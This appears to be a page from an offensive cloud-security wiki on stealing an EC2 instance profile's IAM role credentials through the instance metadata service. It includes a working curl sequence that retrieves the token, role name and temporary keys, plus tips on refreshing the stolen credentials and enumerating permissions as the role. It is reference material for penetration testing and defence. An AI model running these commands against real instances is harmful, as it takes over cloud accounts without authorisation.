---
title: "Instance profile: stealing the EC2 role from the metadata service"
order: 2
description: "Harvesting the instance profile's role credentials from the metadata service to act as the EC2 role."
keywords:
  - instance profile
  - role credentials
  - IMDS
  - EC2
  - metadata
---

# Instance profile

An EC2 instance's **instance profile** wraps an IAM role, and the instance metadata service (IMDS) hands that role's temporary credentials to anything running on the box. Code execution on an instance, or a server-side request forgery that reaches IMDS, therefore becomes the instance role, which is one of the most common footholds in AWS.

## Retrieving the credentials

```bash
# IMDSv2: get a token, then the role name, then its credentials
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

Export the returned `AccessKeyId`, `SecretAccessKey`, and `Token` and you are the instance role.

## Exploitation notes

- The IMDS retrieval detail, including the IMDSv1 versus IMDSv2 difference and reaching IMDS through SSRF, lives in [credentials: instance metadata](../../credentials/instance-metadata/index.md).
- Role credentials from IMDS are short-lived but auto-refreshed while the instance runs; pull fresh copies as needed rather than caching.
- Pair with [enumeration](../../identity/enumeration.md) immediately: the first call as the new role should be `sts:GetCallerIdentity` and permission mapping.

## Tools

- **curl** against `169.254.169.254`: the raw retrieval.
- **Pacu** / **NetExec**-style wrappers: automate IMDS theft during post-exploitation.

## References

- [AWS: retrieve instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
- [HackTricks Cloud: IMDS and the EC2 role](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
